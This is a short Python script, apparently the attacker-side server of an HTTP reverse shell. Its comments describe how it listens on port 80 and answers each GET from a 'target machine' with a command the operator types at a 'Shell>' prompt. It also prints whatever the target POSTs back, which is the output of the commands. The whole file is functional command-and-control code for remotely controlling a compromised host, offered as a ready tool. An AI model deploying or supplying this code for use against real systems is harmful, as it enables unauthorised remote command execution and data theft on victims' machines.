#HTTP server

from http.server import BaseHTTPRequestHandler, HTTPServer    # library use to build simple HTTP server 

HOST_NAME = 'x.x.x.x'   # Server IP address 
PORT_NUMBER = 80   # Listening port 


class MyHandler(BaseHTTPRequestHandler):   # MyHandler defines what we should do when we receive a GET/POST request from the target machine
                                           

    def do_GET(s):
                                         # If there's a GET request, take user input
        command = input("Shell> ")
        s.send_response(200)             # return HTML status 200 (OK)
        s.send_header("Content-type", "text/html")  # Inform the target that content type header is "text/html"
        s.end_headers()
        s.wfile.write(command.encode())           # send the command which we got from the user input

            
    def do_POST(s):
                                                     # If a POST request,  
        s.send_response(200)                         # return HTML status 200 (OK)
        s.end_headers()
        length  = int(s.headers['Content-Length'])   # Define the length which means how many bytes the HTTP POST data contains, the length value has to be integer
        postVar = s.rfile.read(length)               # Read then print the posted data
        print(postVar.decode())
        
        

if __name__ == '__main__':

    # start a server_class and create httpd object and pass the server IP,port number and class handler(MyHandler)
    server_class = HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    
    try:     
        httpd.serve_forever()   # start the HTTP server
    except KeyboardInterrupt:   # if ctrl+c it will Interrupt and stop the server
        print ('[!] Server is terminated')
        httpd.server_close()
